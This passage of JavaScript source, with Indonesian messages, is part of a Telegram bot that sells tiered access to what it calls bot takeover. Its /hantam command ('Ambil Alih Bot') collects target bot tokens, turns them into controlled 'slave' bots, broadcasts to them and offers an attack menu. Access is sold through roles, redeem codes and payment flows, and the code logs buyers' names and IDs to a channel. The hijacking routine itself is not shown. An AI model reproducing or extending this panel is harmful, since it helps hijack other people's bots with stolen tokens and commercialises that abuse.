    else if (arg.startsWith("@")) {
      const d = loadData(); const u = arg.slice(1).toLowerCase();
      const found = Object.values(d.users || {}).find((x) => String(x?.username || "").toLowerCase() === u);
      if (found?.id) targetId = parseInt(found.id, 10);
    }
  }
  if (!targetId) targetId = msg.from?.id ? parseInt(msg.from.id, 10) : null;
  if (!targetId) return;
  const r = getUserRole(targetId);
  const roleStr = r.role === "developer" ? "👑 DEVELOPER" : `${ROLE_LABELS[r.role]}${r.exp ? ` (${fmtExpired(r.exp)})` : " (Permanent)"}`;
  await sendBotText(chatId, `🔎 <b>CEK USER</b>\nID: <code>${targetId}</code>\nRole: <b>${roleStr}</b>`, { parse_mode: "HTML" });
});

// ─── REDEEM ─────────────────────────────────────────────────────────
main.onText(/\/addredeem(?:\s+([\s\S]+))?\s*$/i, async (msg, match) => {
  const userId = msg.from.id, chatId = msg.chat.id;
  trackUser(msg.from);
  if (!hasMinRole(userId, "admin")) { await sendBotText(chatId, "❌ Gak punya akses."); return; }
  const args = String(match?.[1] || "").trim().split(/\s+/).filter(Boolean);
  if (args.length < 2) {
    await sendBotText(chatId,
      `📌 <b>Cara pakai /addredeem</b>\n\n` +
      `• <code>/addredeem CODE role</code>\n` +
      `• <code>/addredeem CODE role hari</code>\n` +
      `• <code>/addredeem CODE role hari max</code>\n\n` +
      `Contoh:\n<code>/addredeem MKNJIR01 prem</code>\n<code>/addredeem VIP01 prem 30 5</code>\n\n` +
      `<b>Role:</b> prem, ress, pt, admin, owner`,
      { parse_mode: "HTML" });
    return;
  }
  const code = args[0].toUpperCase();
  const targetRole = args[1].toLowerCase();
  const hariRaw = args[2] || null;
  const maxRaw = args[3] || null;
  if (!ROLE_LEVELS[targetRole] || targetRole === "developer" || targetRole === "none") {
    await sendBotText(chatId, `❌ Role tidak valid.`, { parse_mode: "HTML" }); return;
  }
  if (!canAddRole(userId, targetRole)) { await sendBotText(chatId, `❌ Gak bisa bikin redeem buat <b>${ROLE_LABELS[targetRole]}</b>.`, { parse_mode: "HTML" }); return; }
  let days = null;
  if (hariRaw && hariRaw !== "0") {
    const h = parseInt(hariRaw.replace(/[^0-9]/g, ""), 10);
    if (!Number.isFinite(h) || h <= 0) { await sendBotText(chatId, "❌ Hari gak valid."); return; }
    days = h;
  }
  let maxUses = null;
  if (maxRaw) {
    const m = parseInt(maxRaw.replace(/[^0-9]/g, ""), 10);
    if (!Number.isFinite(m) || m <= 0) { await sendBotText(chatId, "❌ Max gak valid."); return; }
    maxUses = m;
  }
  const d = loadData();
  if (d.redeems[code]) { await sendBotText(chatId, `⚠️ Code <code>${code}</code> udah ada.`, { parse_mode: "HTML" }); return; }
  d.redeems[code] = { role: targetRole, days, maxUses, createdBy: userId, createdAt: Date.now(), usedBy: [] };
  saveData(d);
  const durasi = days ? `${days} hari` : "Permanen";
  const limitInfo = maxUses ? `${maxUses} orang` : "Unlimited";
  await sendBotText(chatId, `✅ <b>Redeem dibuat!</b>\n\n🎁 Code: <code>${code}</code>\n👑 Role: <b>${ROLE_LABELS[targetRole]}</b>\n⏰ Durasi: <b>${durasi}</b>\n👥 Max: <b>${limitInfo}</b>`, { parse_mode: "HTML" });
  sendChannelNotif(`🎁 <b>REDEEM DIBUAT</b>\n━━━━━━━━━━━━━━\n🎫 Code: <code>${code}</code>\n👑 Role: <b>${ROLE_LABELS[targetRole]}</b>\n⏰ Durasi: <b>${durasi}</b>\n👥 Max: <b>${limitInfo}</b>\n👤 Oleh: <code>${maskNumericId(userId)}</code>`);
});

main.onText(/\/redeem(?:\s+([\s\S]+))?\s*$/i, async (msg, match) => {
  const userId = msg.from.id, chatId = msg.chat.id;
  trackUser(msg.from);
  const codeRaw = String(match?.[1] || "").trim();
  if (!codeRaw) {
    userState[userId] = "waiting_redeem_code";
    await sendBotText(chatId, `🎁 Kirim kode redeem kamu.\n\n/cancel untuk batal.`, { parse_mode: "HTML" });
    return;
  }
  await processRedeem(chatId, userId, codeRaw);
});

async function processRedeem(chatId, userId, codeRaw) {
  const code = String(codeRaw || "").toUpperCase().trim();
  if (!code) { await sendBotText(chatId, "❌ Kode kosong."); return; }
  const d = loadData();
  const redeem = d.redeems?.[code];
  if (!redeem) { await sendBotText(chatId, `❌ Kode <code>${code}</code> tidak ditemukan.`, { parse_mode: "HTML" }); return; }
  if (Array.isArray(redeem.usedBy) && redeem.usedBy.some(x => (typeof x === "object" ? x.id : x) === userId)) {
    await sendBotText(chatId, `⚠️ Kamu udah pernah pakai kode ini.`); return;
  }
  const usedCount = Array.isArray(redeem.usedBy) ? redeem.usedBy.length : 0;
  const maxUses = redeem.maxUses === null || redeem.maxUses === undefined ? null : Number(redeem.maxUses);
  if (maxUses !== null && Number.isFinite(maxUses) && maxUses > 0 && usedCount >= maxUses) {
    await sendBotText(chatId, `❌ Kode habis (max ${maxUses}).`, { parse_mode: "HTML" }); return;
  }
  let expireAtMs = null, durationLabel = "Permanent";
  if (redeem.days && Number(redeem.days) > 0) {
    expireAtMs = Date.now() + Number(redeem.days) * 24 * 60 * 60 * 1000;
    durationLabel = `${redeem.days} hari`;
  }
  setUserRole(userId, redeem.role, expireAtMs);
  const dUser = loadData();
  const uInfo = dUser.users?.[userId] || {};
  const userName = [uInfo.first_name, uInfo.last_name].filter(Boolean).join(" ").trim() || "(tanpa nama)";
  const userAt = uInfo.username ? `@${uInfo.username}` : "(tanpa username)";
  const dUpd = loadData();
  if (dUpd.redeems[code]) {
    dUpd.redeems[code].usedBy = Array.isArray(dUpd.redeems[code].usedBy) ? dUpd.redeems[code].usedBy : [];
    const already = dUpd.redeems[code].usedBy.some(x => (typeof x === "object" ? x.id : x) === userId);
    if (!already) dUpd.redeems[code].usedBy.push({ id: userId, name: userName, username: uInfo.username || null, at: userAt, usedAt: Date.now(), duration: durationLabel });
    saveData(dUpd);
  }
  const expLabel = expireAtMs ? `sampai ${new Date(expireAtMs).toLocaleString("id-ID")}` : "Permanen";
  const newUsedCount = usedCount + 1;
  await sendBotText(chatId, `🎉 <b>Redeem Berhasil!</b>\n\n🎁 Code: <code>${code}</code>\n👑 Role: <b>${ROLE_LABELS[redeem.role]}</b>\n⏰ Durasi: <b>${durationLabel}</b>\n📅 ${expLabel}`, { parse_mode: "HTML" });
  sendChannelNotif(`✅ <b>REDEEM DIPAKAI</b>\n━━━━━━━━━━━━━━\n🎫 Code: <code>${code}</code>\n👑 Role: <b>${ROLE_LABELS[redeem.role]}</b>\n⏰ Durasi: <b>${durationLabel}</b>\n👥 Pemakaian: <b>${newUsedCount}${maxUses ? "/" + maxUses : ""}</b>\n━━━━━━━━━━━━━━\n👤 Nama: <b>${userName}</b>\n📛 Username: ${userAt}\n🆔 ID: <code>${userId}</code>`);
}

main.onText(/\/logredeem(?:\s+(\S+))?\s*$/i, async (msg, match) => {
  const userId = msg.from.id, chatId = msg.chat.id;
  if (!hasMinRole(userId, "admin")) return;
  const codeArg = String(match?.[1] || "").trim().toUpperCase();
  const d = loadData();
  if (codeArg) {
    const redeem = d.redeems?.[codeArg];
    if (!redeem) { await sendBotText(chatId, `❌ Code tidak ditemukan.`); return; }
    const usedBy = Array.isArray(redeem.usedBy) ? redeem.usedBy : [];
    const durasi = redeem.days ? `${redeem.days} hari` : "Permanen";
    const max = redeem.maxUses === null || redeem.maxUses === undefined ? null : Number(redeem.maxUses);
    const limitStr = max ? `${usedBy.length}/${max}` : `${usedBy.length}/∞`;
    let text = `📜 <b>LOG REDEEM: ${codeArg}</b>\n━━━━━━━━━━━━━━\n👑 Role: <b>${ROLE_LABELS[redeem.role]}</b>\n⏰ Durasi: <b>${durasi}</b>\n👥 Pemakaian: <b>${limitStr}</b>\n\n`;
    usedBy.forEach((u, i) => {
      if (typeof u === "object") text += `<b>${i + 1}. ${u.name}</b>\n   📛 ${u.at}\n   🆔 <code>${u.id}</code>\n\n`;
      else text += `<b>${i + 1}. ID: <code>${u}</code></b>\n\n`;
    });
    await sendBotText(chatId, text, { parse_mode: "HTML" });
    return;
  }
  const redeems = Object.entries(d.redeems || {});
  if (!redeems.length) { await sendBotText(chatId, "📭 Belum ada redeem."); return; }
  let text = `📜 <b>LOG SEMUA REDEEM</b>\n━━━━━━━━━━━━━━\n\n`;
  for (const [code, r] of redeems) {
    const usedBy = Array.isArray(r.usedBy) ? r.usedBy : [];
    const max = r.maxUses === null || r.maxUses === undefined ? null : Number(r.maxUses);
    const limitStr = max ? `${usedBy.length}/${max}` : `${usedBy.length}/∞`;
    const durasi = r.days ? `${r.days} hari` : "Permanen";
    text += `🎫 <code>${code}</code>\n   👑 ${ROLE_LABELS[r.role]} • ⏰ ${durasi}\n   👥 Dipakai: <b>${limitStr}</b>\n\n`;
  }
  await sendBotText(chatId, text, { parse_mode: "HTML" });
});

// ─── /hantam /listbot /autodelete /delete ──────────────────────────
main.onText(/\/hanta(?:m|n)(?:\s+([\s\S]+))?\s*$/i, async (msg, match) => {
  const userId = msg.from.id, chatId = msg.chat.id;
  trackUser(msg.from);
  if (!hasMinRole(userId, "prem")) {
    const okChannel = await enforceForceChannelOrPrompt(chatId, userId);
    if (!okChannel) return;
    const okJoin = await enforceForceJoinOrSendPrompt(chatId, userId);
    if (!okJoin) return;
    sendBotText(chatId, "❌ Kamu gak punya akses buat bikin bot.");
    return;
  }
  const tokenArg = String(match?.[1] || "").trim();
  if (tokenArg) { await createSlaveBotFromToken(tokenArg, userId, chatId, msg.from); return; }
  userState[userId] = "waiting_token";
  sendBotText(chatId, "🤖 <b>Ambil Alih Bot</b>\n\nKirim <b>token bot target</b>:\n\n/cancel untuk batal.", { parse_mode: "HTML" });
});

main.onText(/\/listbot\s*$/i, async (msg) => {
  const userId = msg.from.id, chatId = msg.chat.id;
  trackUser(msg.from);
  const d = loadData();
  const tokens = Object.keys(d.bots || {});
  if (!tokens.length) return sendBotText(chatId, "📭 Belum ada bot.");
  const botList = hasMinRole(userId, "owner") ? tokens.map(t => ({ token: t, ...d.bots[t] })) : Object.entries(d.bots).filter(([, v]) => v.ownerId === userId).map(([t, v]) => ({ token: t, ...v }));
  if (!botList.length) return sendBotText(chatId, "📭 Kamu belum punya bot.");
  let aktif = 0, mati = 0;
  for (const bot of botList) {
    let isAlive = false;
    try { const s = slaveBots[bot.token]; if (s) { await s.getMe(); isAlive = true; } else { const tmp = new TelegramBot(bot.token, { polling: false }); await tmp.getMe(); isAlive = true; } }
    catch (e) {
      const code = e?.response?.statusCode || e?.code;
      const mErr = String(e?.message || "").toLowerCase();
      if (code === 401 || code === 403 || mErr.includes("unauthorized")) isAlive = false; else isAlive = true;
    }
    isAlive ? aktif++ : mati++;
  }
  const up = process.uptime();
  await sendBotText(chatId, `<blockquote>⏱️ Runtime: ${Math.floor(up / 86400)} hari ${Math.floor((up % 86400) / 3600)} jam ${Math.floor((up % 3600) / 60)} menit\n📊 Total Bot: ${botList.length}\n✅ Aktif: ${aktif}\n❌ Mati: ${mati}</blockquote>`, { parse_mode: "HTML" });
});

main.onText(/\/autodelete(?:\s+(on|off))?\s*$/i, async (msg, match) => {
  const chatId = msg.chat.id, userId = msg.from.id;
  if (!isAllowedCreator(userId)) return;
  const arg = (match?.[1] || "").toLowerCase().trim();
  const d = loadData();
  const myBots = Object.entries(d.bots || {}).filter(([, v]) => hasMinRole(userId, "owner") || v.ownerId === userId);
  if (!arg) {
    let text = "🗑 <b>Auto Hapus</b>\n━━━━━━━━━━━━━━\n";
    myBots.forEach(([, v]) => { text += `🤖 @${v.name || "?"} — ${v.autoDeleteEnabled ? "✅ ON" : "❌ OFF"}\n`; });
    await sendBotText(chatId, text, { parse_mode: "HTML" }); return;
  }
  const en = arg === "on";
  for (const [t] of myBots) d.bots[t].autoDeleteEnabled = en;
  saveData(d);
  await sendBotText(chatId, en ? `✅ Auto Hapus ON (${myBots.length} bot)` : `❌ Auto Hapus OFF (${myBots.length} bot)`);
});

main.onText(/\/delete(?:\s+(.+))?\s*$/i, async (msg, match) => {
  const chatId = msg.chat.id, userId = msg.from.id;
  const tokenInput = String(match?.[1] || msg.reply_to_message?.text || "").trim();
  if (!tokenInput) { await sendBotText(chatId, "Pakai: /delete <token>"); return; }
  const d = loadData();
  const tokens = Object.keys(d.bots || {});
  let token = d.bots[tokenInput] ? tokenInput : null;
  if (!token) {
    const matches = tokens.filter((t) => t.startsWith(tokenInput));
    if (matches.length === 1) token = matches[0];
  }
  if (!token || !d.bots[token]) { await sendBotText(chatId, "❌ Bot tidak ditemukan."); return; }
  if (!hasMinRole(userId, "owner") && d.bots[token].ownerId !== userId) { await sendBotText(chatId, "❌ Gak punya akses."); return; }
  const botName = d.bots[token].name ? `@${d.bots[token].name}` : "?";
  try {
    if (slaveBots[token]) { try { slaveBots[token].stopPolling(); } catch {} delete slaveBots[token]; }
    delete d.bots[token]; saveData(d);
    await sendBotText(chatId, `✅ Bot ${botName} dihapus.`, { parse_mode: "HTML" });
  } catch (e) { await sendBotText(chatId, `❌ Gagal: ${e.message}`); }
});

// ─── CALLBACK HANDLER ───────────────────────────────────────────────
main.on("callback_query", async (query) => {
  const userId = query.from.id, chatId = query.message.chat.id, data = query.data;
  main.answerCallbackQuery(query.id).catch(() => {});
  trackUser(query.from);
  try { if (query.message?.message_id) await main.deleteMessage(chatId, query.message.message_id); } catch {}

  const allowUserOnly = ["check_join", "check_channel_join", "redeem_open", "buy_access_open", "shop_open", "shop_listsc", "shop_buy_", "shop_pay_dana_", "shop_pay_qris_", "shop_back", "buy_access_1d_start", "buy_access_perm_start", "buyacc_pay_dana_", "buyacc_pay_qris_"];
  const isAllowedForUser = allowUserOnly.some(p => data === p || data.startsWith(p));

  if (!hasMinRole(userId, "prem") && !isAllowedForUser) {
    const okChannel = await enforceForceChannelOrPrompt(chatId, userId);
    if (!okChannel) return;
    const ok = await enforceForceJoinOrSendPrompt(chatId, userId);
    if (!ok) return;
    if (getUserRole(userId).role === "none") { await sendStartMenuOnly(chatId, userId, false, query.from); return; }
  }

  if (data === "check_join") {
    if (hasMinRole(userId, "prem")) return;
    if (!await isUserJoinedRequiredChat(userId)) { await enforceForceJoinOrSendPrompt(chatId, userId); return; }
    await sendStartMenuOnly(chatId, userId, false, query.from); return;
  }
  if (data === "check_channel_join") {
    if (!await isUserJoinedForceChannel(userId)) { await enforceForceChannelOrPrompt(chatId, userId); return; }
    await sendStartMenuOnly(chatId, userId, hasMinRole(userId, "prem"), query.from); return;
  }
  if (data === "redeem_open") {
    userState[userId] = "waiting_redeem_code";
    await sendBotText(chatId, `🎁 Kirim kode redeem kamu.\n\n/cancel untuk batal.`, { parse_mode: "HTML" }); return;
  }
  if (data === "buy_access_open") {
    await sendBotText(chatId, `🛒 <b>Menu Toko</b>`, { parse_mode: "HTML", reply_markup: buildShopMenuKeyboard() }); return;
  }

  if (data === "menu_all") {
    const r = getUserRole(userId);
    const roleLabel = ROLE_LABELS[r.role] || ROLE_LABELS.none;
    const expLabel = r.exp ? fmtExpired(r.exp) : "Permanen";
    const caption =
      `<blockquote>💀 Meki x bot rasuk\n` +
      `🕊️ By meki\n\n` +
      `👑 Role: ${roleLabel}\n` +
      `⏰ Expired: ${expLabel}</blockquote>\n\n` +
      `👇 <i>Pilih menu:</i>`;
    const reply_markup = buildUserMenuKeyboard(userId);
    const d = loadData(); const sm = d.settings?.startMedia || {};
    try {
      if (START_PHOTO_PATH && fs.existsSync(START_PHOTO_PATH)) await main.sendPhoto(chatId, START_PHOTO_PATH, { caption, parse_mode: "HTML", reply_markup });
      else if (sm.photoFileId) await main.sendPhoto(chatId, sm.photoFileId, { caption, parse_mode: "HTML", reply_markup });
      else await sendBotText(chatId, caption, { parse_mode: "HTML", reply_markup });
    } catch (e) { await sendBotText(chatId, caption, { parse_mode: "HTML", reply_markup }); }
    return;
  }
  if (data === "menu_main" || data === "back_user" || data === "back_admin") { await sendStartMenuOnly(chatId, userId, hasMinRole(userId, "prem"), query.from); return; }

  if (data === "menu_addrole") {
    const myRole = getUserRole(userId);
    if (myRole.level < ROLE_LEVELS.pt) return;
    sendBotText(chatId, `➕ <b>Menu Add Role</b>`, { parse_mode: "HTML", reply_markup: buildAddRoleMenuKeyboard(userId) }); return;
  }
  if (data.startsWith("addrole_")) {
    const targetRole = data.slice("addrole_".length);
    if (!canAddRole(userId, targetRole)) return;
    userState[userId] = `waiting_add_role:${targetRole}`;
    await sendBotText(chatId, `➕ <b>Add Role ${ROLE_LABELS[targetRole]}</b>\n\nKirim:\n• <code>ID</code> → permanen\n• <code>ID hari</code> → temporary`, { parse_mode: "HTML" }); return;
  }

  if (data === "menu_listrole") {
    if (!hasMinRole(userId, "admin")) return;
    const d = ensureRolesShape(loadData());
    let text = "📋 <b>Daftar Role</b>\n━━━━━━━━━━━━━━\n";
    text += `👑 <b>DEVELOPER</b>: ${DEVELOPER_IDS.map(maskNumericId).join(", ")}\n\n`;
    for (const roleKey of ["owner", "admin", "pt", "ress", "prem"]) {
      const entries = Object.entries(d.roles[roleKey] || {});
      if (!entries.length) continue;
      text += `<b>${ROLE_LABELS[roleKey]}</b> (${entries.length})\n`;
      for (const [uid, exp] of entries) text += `  • <code>${maskNumericId(uid)}</code> — ${fmtExpired(exp)}\n`;
      text += "\n";
    }
    await sendBotText(chatId, text, { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "menu_all", style: "primary" }]] } }); return;
  }

  if (data === "menu_listredeem") {
    if (!hasMinRole(userId, "owner")) return;
    const d = loadData();
    const redeems = Object.entries(d.redeems || {});
    if (!redeems.length) { await sendBotText(chatId, "🎁 Belum ada redeem.", { reply_markup: { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "menu_owner", style: "primary" }]] } }); return; }
    let text = `🎁 <b>Daftar Redeem (${redeems.length})</b>\n━━━━━━━━━━━━━━\n`;
    for (const [code, r] of redeems) {
      const durasi = r.days ? `${r.days} hari` : "Permanen";
      const usedBy = Array.isArray(r.usedBy) ? r.usedBy : [];
      const max = r.maxUses === null || r.maxUses === undefined ? null : Number(r.maxUses);
      const limitStr = max ? `${usedBy.length}/${max}` : `${usedBy.length}/∞`;
      text += `\n🎫 <code>${code}</code>\n   👑 ${ROLE_LABELS[r.role]}\n   ⏰ ${durasi}\n   📊 ${limitStr}\n`;
    }
    const keyboard = redeems.map(([code]) => ([{ text: `🗑 Hapus ${code}`, callback_data: `delredeem_${code}` }]));
    keyboard.push([{ text: "🔙 Kembali", callback_data: "menu_owner", style: "primary" }]);
    await sendBotText(chatId, text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } }); return;
  }
  if (data.startsWith("delredeem_")) {
    if (!hasMinRole(userId, "owner")) return;
    const code = data.slice("delredeem_".length);
    const d = loadData();
    if (d.redeems[code]) { delete d.redeems[code]; saveData(d); sendBotText(chatId, `✅ Redeem <code>${code}</code> dihapus.`, { parse_mode: "HTML" }); }
    return;
  }

  if (data === "tqto") {
    await sendBotText(chatId, `<b>💌 TERIMA KASIH</b>\n━━━━━━━━━━━━━━━━\n• <b>Allah</b>\n• <b>all team</b>\n• <b>Keluarga</b>\n• <b>All buyer</b>\n━━━━━━━━━━━━━━━━`, { parse_mode: "HTML" }); return;
  }

  if (data === "buy_access_start" || data === "buy_access_perm_start") {
    userState[userId] = "waiting_access_target_id:perm";
    await sendBotText(chatId, `🛒 <b>${ACCESS_BOT_PRODUCT_NAME}</b>\n\nKirim ID Telegram kamu.`, { parse_mode: "HTML" }); return;
  }
  if (data === "buy_access_1d_start") {
    userState[userId] = "waiting_access_target_id:1d";
    await sendBotText(chatId, `🛒 <b>${ACCESS_1D_PRODUCT_NAME}</b>\n\nKirim ID Telegram kamu.`, { parse_mode: "HTML" }); return;
  }

  if (data === "u_create") {
    if (!isAllowedCreator(userId)) return;
    userState[userId] = "waiting_token";
    sendBotText(chatId, "🤖 Kirim token bot target:", { parse_mode: "HTML" }); return;
  }
  if (data === "u_list") {
    const d = loadData();
    const myBots = Object.entries(d.bots).filter(([, v]) => v.ownerId === userId);
    if (!myBots.length) { sendBotText(chatId, "📭 Belum punya bot."); return; }
    let text = "📋 <b>Bot Kamu:</b>\n━━━━━━━━━━━━━━\n";
    myBots.forEach(([t, v], i) => { text += `${i + 1}. @${v.name || "?"}\n   📊 ${v.usedCount || 0}/∞\n\n`; });
    sendBotText(chatId, text, { parse_mode: "HTML" }); return;
  }
  if (data === "u_remove") {
    const d = loadData();
    const myBots = Object.entries(d.bots).filter(([, v]) => v.ownerId === userId);
    if (!myBots.length) { sendBotText(chatId, "📭 Belum punya bot."); return; }
    const keyboard = myBots.map(([t, v]) => ([{ text: `❌ @${v.name || "?"}`, callback_data: `udel_${tokenToIdx(t)}` }]));
    keyboard.push([{ text: "🔙 Kembali", callback_data: "menu_attack", style: "primary" }]);
    sendBotText(chatId, "Pilih bot:", { reply_markup: { inline_keyboard: keyboard } }); return;
  }
  if (data.startsWith("udel_")) {
    const token = idxToToken(data.slice(5)) || data.slice(5);
    const d = loadData();
    if (d.bots[token] && d.bots[token].ownerId === userId) {
      if (slaveBots[token]) { slaveBots[token].stopPolling(); delete slaveBots[token]; }
      delete d.bots[token]; saveData(d);
      sendBotText(chatId, "✅ Bot dihapus.");
    } else sendBotText(chatId, "❌ Tidak ditemukan.");
    return;
  }

  if (data === "a_list") {
    if (!hasMinRole(userId, "owner")) return;
    const d = loadData(); const tokens = Object.keys(d.bots);
    if (!tokens.length) { sendBotText(chatId, "📭 Belum ada bot."); return; }
    let text = "📋 <b>Semua Bot:</b>\n━━━━━━━━━━━━━━\n";
    tokens.forEach((t, i) => { const v = d.bots[t]; text += `${i + 1}. @${v.name || "?"}\n   👤 <code>${v.ownerId}</code>\n\n`; });
    sendBotText(chatId, text, { parse_mode: "HTML" }); return;
  }
  if (data === "a_remove") {
    if (!hasMinRole(userId, "owner")) return;
    const d = loadData(); const tokens = Object.keys(d.bots);
    if (!tokens.length) { sendBotText(chatId, "📭 Belum ada bot."); return; }
    const keyboard = tokens.map(t => ([{ text: `❌ @${d.bots[t].name || "?"}`, callback_data: `adel_${tokenToIdx(t)}` }]));
    keyboard.push([{ text: "🔙 Kembali", callback_data: "menu_owner", style: "primary" }]);
    sendBotText(chatId, "Pilih bot:", { reply_markup: { inline_keyboard: keyboard } }); return;
  }
  if (data.startsWith("adel_")) {
    if (!hasMinRole(userId, "owner")) return;
    const token = idxToToken(data.slice(5)) || data.slice(5);
    const d = loadData();
    if (d.bots[token]) { if (slaveBots[token]) { slaveBots[token].stopPolling(); delete slaveBots[token]; } delete d.bots[token]; saveData(d); sendBotText(chatId, "✅ Bot dihapus."); }
    return;
  }
  if (data === "a_users") {
    if (!hasMinRole(userId, "owner")) return;
    const d = loadData();
    const owners = [...new Set(Object.values(d.bots).map(v => v.ownerId).filter(Boolean))];
    if (!owners.length) { sendBotText(chatId, "👥 Belum ada user."); return; }
    let text = "👥 <b>Daftar User:</b>\n━━━━━━━━━━━━━━\n";
    owners.forEach((id, i) => { const c = Object.values(d.bots).filter(v => v.ownerId === id).length; text += `${i + 1}. <code>${id}</code> — ${c} bot\n`; });
    sendBotText(chatId, text, { parse_mode: "HTML" }); return;
  }
  if (data === "a_broadcast") {
    if (!hasMinRole(userId, "owner")) return;
    userState[userId] = "admin_waiting_broadcast";
    sendBotText(chatId, "📢 Kirim pesan broadcast:", { parse_mode: "HTML" }); return;
  }
  if (data === "a_forcejoin") {
    if (!hasMinRole(userId, "owner")) return;
    const d = loadData(); const fj = d.settings.forceJoin;
    sendBotText(chatId, `🔒 <b>Wajib Join</b>\n\nStatus: ${fj.enabled ? "✅ ON" : "❌ OFF"}`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: [
        [{ text: fj.enabled ? "Matikan" : "Aktifkan", callback_data: "a_fj_toggle" }],
        [{ text: "Set Target", callback_data: "a_fj_set", style: "primary" }],
        [{ text: "🔙 Kembali", callback_data: "menu_group", style: "primary" }]
      ]}}); return;
  }
  if (data === "a_fj_toggle") {
    if (!hasMinRole(userId, "owner")) return;
    const d = loadData(); d.settings.forceJoin.enabled = !d.settings.forceJoin.enabled; saveData(d);
    sendBotText(chatId, `✅ Wajib Join ${d.settings.forceJoin.enabled ? "ON" : "OFF"}.`); return;
  }
  if (data === "a_fj_set") {
    if (!hasMinRole(userId, "owner")) return;
    userState[userId] = "admin_waiting_forcejoin";
    sendBotText(chatId, "🔒 Kirim: <code>CHAT_ID|INVITE_LINK|JUDUL</code>", { parse_mode: "HTML" }); return;
  }
  if (data === "menu_bcslave") {
    if (!hasMinRole(userId, "owner")) return;
    userState[userId] = "waiting_broadcast_slave";
    sendBotText(chatId, "📢 Broadcast ke Bot. Kirim pesan:", { parse_mode: "HTML" }); return;
  }
  if (data === "u_set_autoreply" || data === "setautojawab_global") {
    if (!hasMinRole(userId, "owner")) return;
    userState[userId] = "waiting_global_autojawab";
    sendBotText(chatId, "✍️ Kirim teks auto balas:", { parse_mode: "HTML" }); return;
  }

  if (data === "menu_attack") { sendBotText(chatId, `⚔️ <b>Menu Serang</b>`, { parse_mode: "HTML", reply_markup: buildAttackMenuKeyboard() }); return; }
  if (data === "menu_shop") { sendBotText(chatId, `🛒 <b>Menu Toko</b>`, { parse_mode: "HTML", reply_markup: buildShopMenuKeyboard() }); return; }
  if (data === "menu_group") { sendBotText(chatId, `👥 <b>Menu Grup</b>`, { parse_mode: "HTML", reply_markup: buildGroupMenuKeyboard() }); return; }
  if (data === "menu_owner") { if (!hasMinRole(userId, "owner")) return; sendBotText(chatId, `👑 <b>Menu Owner</b>`, { parse_mode: "HTML", reply_markup: buildOwnerMenuKeyboard() }); return; }

  if (data === "menu_clean") {
    if (!hasMinRole(userId, "owner")) return;
    const d2 = loadData(); const tokens2 = Object.keys(d2.bots || {});
    if (!tokens2.length) { sendBotText(chatId, "📭 Belum ada bot."); return; }
    const loading2 = await sendBotText(chatId, `🔍 Cek ${tokens2.length} bot...`);
    const dead2 = [], alive2 = [];
    for (const token of tokens2) {
      const slave = slaveBots[token]; let isAlive = false;
      try { if (slave) { await slave.getMe(); isAlive = true; } else { const tmp = new TelegramBot(token, { polling: false }); await tmp.getMe(); isAlive = true; } }
      catch (e) { const code = e?.response?.statusCode; if (code === 401 || code === 403) isAlive = false; else isAlive = true; }
      isAlive ? alive2.push(token) : dead2.push(token);
    }
    if (!dead2.length) { main.editMessageText(`✅ Semua ${alive2.length} bot sehat.`, { chat_id: chatId, message_id: loading2.message_id }).catch(() => {}); return; }
    for (const token of dead2) { try { if (slaveBots[token]) { try { slaveBots[token].stopPolling(); } catch {} delete slaveBots[token]; } delete d2.bots[token]; } catch {} }
    saveData(d2);
    main.editMessageText(`🧹 Selesai!\n✅ Sehat: ${alive2.length}\n🗑 Dihapus: ${dead2.length}`, { chat_id: chatId, message_id: loading2.message_id }).catch(() => {});
    return;
  }

  if (data === "shop_open") {
    const d = loadData(); const scripts = Object.entries(d.scripts || {});
    if (!scripts.length) { sendBotText(chatId, "📭 Belum ada script."); return; }
    const keyboard = scripts.map(([id, sc]) => ([{ text: `📦 ${sc.name} — Rp${Number(sc.price).toLocaleString("id-ID")}`, callback_data: `shop_buy_${id}` }]));
    sendBotText(chatId, SHOP_WELCOME, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } }); return;
  }
  if (data === "shop_admin") {
    if (!hasMinRole(userId, "owner")) return;
    const d = loadData();
    sendBotText(chatId, `🛒 <b>Kelola Script</b>\n\n📦 Script: ${Object.keys(d.scripts || {}).length}`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: [
        [{ text: "📋 Daftar Script", callback_data: "shop_listsc", style: "primary" }],
        [{ text: "⏳ Order Pending", callback_data: "shop_orders", style: "danger" }],
        [{ text: "🔙 Kembali", callback_data: "menu_owner", style: "primary" }]
      ]}}); return;
  }
  if (data === "shop_listsc") {
    const d = loadData(); const scripts = Object.entries(d.scripts || {});
    if (!scripts.length) { sendBotText(chatId, "📭 Belum ada script."); return; }
    let text = "📦 <b>Script:</b>\n━━━━━━━━━━━━━━\n";
    scripts.forEach(([id, sc], i) => { text += `${i + 1}. <b>${sc.name}</b> — Rp${Number(sc.price).toLocaleString("id-ID")}\n`; });
    const keyboard = scripts.map(([id, sc]) => ([{ text: `📦 Beli ${sc.name}`, callback_data: `shop_buy_${id}` }]));
    keyboard.push([{ text: "🔙 Kembali", callback_data: "shop_admin", style: "primary" }]);
    sendBotText(chatId, text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } }); return;
  }
  if (data === "shop_orders") {
    if (!hasMinRole(userId, "owner")) return;
    const d = loadData(); const pending = Object.entries(d.orders || {}).filter(([, o]) => o.status === "pending_proof");
    if (!pending.length) { sendBotText(chatId, "📭 Tidak ada order pending."); return; }
    let text = `⏳ <b>Order Pending (${pending.length})</b>\n`;
    pending.forEach(([id, o]) => { text += `\n<code>${id}</code> — ${o.itemName || "?"}\n`; });
    sendBotText(chatId, text, { parse_mode: "HTML" }); return;
  }
});

// ─── MESSAGE HANDLER (MAIN) ────────────────────────────────────────
main.on("message", async (msg) => {
  if (AUTO_PREM_ENABLED && msg.new_chat_members && Array.isArray(msg.new_chat_members)) {
    if (Number(msg.chat.id) === Number(GROUP_AUTO_PREM_ID)) {
      for (const member of msg.new_chat_members) {
        if (member.is_bot) continue;
        const cur = getUserRole(member.id);
        if (cur.level >= ROLE_LEVELS.prem) continue;
        setUserRole(member.id, "prem", null);
        sendBotText(member.id, `🎉 <b>Selamat datang!</b>\n\nKamu dapet role <b>PREM (Permanen)</b>.\n\nKetik /start buat lihat menu.`, { parse_mode: "HTML" }).catch(() => {});
        sendChannelNotif(`🎉 <b>AUTO PREM</b>\nUser: <code>${maskNumericId(member.id)}</code>\nRole: PREM (Permanen)`);
      }
    }
  }

